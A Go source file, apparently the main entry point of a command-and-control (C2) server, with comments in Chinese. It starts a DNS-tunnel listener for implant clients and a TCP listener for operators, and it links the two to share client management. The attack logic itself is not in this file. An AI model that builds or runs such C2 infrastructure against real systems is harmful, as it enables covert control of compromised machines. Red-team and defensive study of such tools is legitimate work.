package main

import (
	"c2_server/config"
	"c2_server/server"
	"fmt"
	"log"
	"sync"
)

func main() {
	// 加载配置文件
	err := config.Config_Init()
	if err != nil {
		log.Fatalf("加载配置文件失败: %v", err)
	}

	// 启动DNS隧道服务器(从配置文件读取端口)
	dnsServer := server.NewDNSServer(config.DNSServerPort)

	// 启动TCP控制端服务器(从配置文件读取端口)
	tcpServer := server.NewServer(config.TCPServerPort)

	// 将DNS服务器与TCP服务器关联，共享客户端管理
	dnsServer.SetTCPServer(tcpServer)
	tcpServer.SetDNSServer(dnsServer)

	fmt.Println("C2服务器启动中...")
	fmt.Printf("- DNS隧道服务器: UDP %s端口 (客户端连接)\n", config.DNSServerPort)
	fmt.Printf("- TCP控制服务器: TCP %s端口 (控制端连接)\n", config.TCPServerPort)

	var wg sync.WaitGroup
	wg.Add(2)

	// 启动DNS服务器
	go func() {
		defer wg.Done()
		err := dnsServer.Start()
		if err != nil {
			log.Fatalf("DNS服务器启动失败: %v", err)
		}
	}()

	// 启动TCP服务器
	go func() {
		defer wg.Done()
		err := tcpServer.Start()
		if err != nil {
			log.Fatalf("TCP服务器启动失败: %v", err)
		}
	}()

	wg.Wait()
}
